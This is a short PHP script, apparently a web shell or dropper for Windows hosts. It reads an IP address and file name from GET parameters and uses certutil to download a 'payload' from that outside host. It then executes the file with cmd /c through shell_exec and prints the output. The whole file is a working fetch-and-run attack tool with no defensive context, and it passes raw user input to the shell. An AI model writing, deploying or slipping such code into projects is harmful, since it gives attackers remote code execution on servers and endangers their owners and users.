<?php

function executeCommand($command){
    $output = shell_exec($command);
    echo "<pre>Executed: $command</pre>";
    echo "<pre>$output</pre>";
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $ip = $_GET['ip'];
    $file = $_GET['file'];
    $url = "http://$ip/$file";
    echo "<pre>Downloading payload from: $url</pre>";
    
    // Use double quotes to correctly expand PHP variables
    $downloadcmd = "certutil -urlcache -split -f \"$url\" \"$file\"";
    // Use the full path to the executable to avoid issues
    $runcmd = "cmd /c \"$file\"";
    
    executeCommand($downloadcmd);
    executeCommand($runcmd);  
} else {
    echo "Use GET method!!";
}
?>
